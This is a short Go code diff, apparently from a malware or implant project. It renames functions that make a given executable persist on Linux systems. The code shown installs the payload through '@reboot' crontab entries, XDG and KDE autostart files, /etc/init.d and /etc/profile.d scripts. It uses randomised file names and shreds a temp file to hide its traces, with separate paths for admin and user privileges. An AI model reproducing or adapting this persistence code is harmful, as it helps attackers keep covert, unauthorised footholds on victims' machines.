@@ -24,19 +24,19 @@ func Persist(path string) {
 
 // PersistAdmin persistence using admin privileges
 func PersistAdmin(path string) {
-	Xdg(path, true)
-	Crontab(path)
-	ProfileD(path)
-	InitD(path)
+	xdg(path, true)
+	crontab(path)
+	profileD(path)
+	initD(path)
 }
 
 // PersistUser persistence using user privileges
 func PersistUser(path string) {
-	Xdg(path, false)
-	Crontab(path)
+	xdg(path, false)
+	crontab(path)
 }
 
-func Crontab(path string) {
+func crontab(path string) {
 	err := ioutil.WriteFile("tmp", []byte("@reboot "+path), os.ModePerm)
 	if err != nil {
 		return
@@ -45,7 +45,7 @@ func Crontab(path string) {
 	shred.Conf{Zeros: true, Times: 1, Remove: true}.File("tmp")
 }
 
-func Xdg(path string, admin bool) {
+func xdg(path string, admin bool) {
 	conf := `[Desktop Entry]
 Type=Application
 Name=` + crypto.GenRandString() + `
@@ -58,14 +58,14 @@ Terminal=false`
 	}
 
 }
-func KdePlasma(path string) {
+func kdePlasma(path string) {
 	ioutil.WriteFile("~/.config/autostart-scripts/"+crypto.GenRandString()+".sh", []byte(sh+path), 0777)
 }
 
-func InitD(path string) {
+func initD(path string) {
 	ioutil.WriteFile("/etc/init.d/"+crypto.GenRandString(), []byte(sh+path), 755)
 }
 
-func ProfileD(path string) {
+func profileD(path string) {
 	ioutil.WriteFile("/etc/profile.d/"+crypto.GenRandString()+".sh", []byte(path), 644)
 }
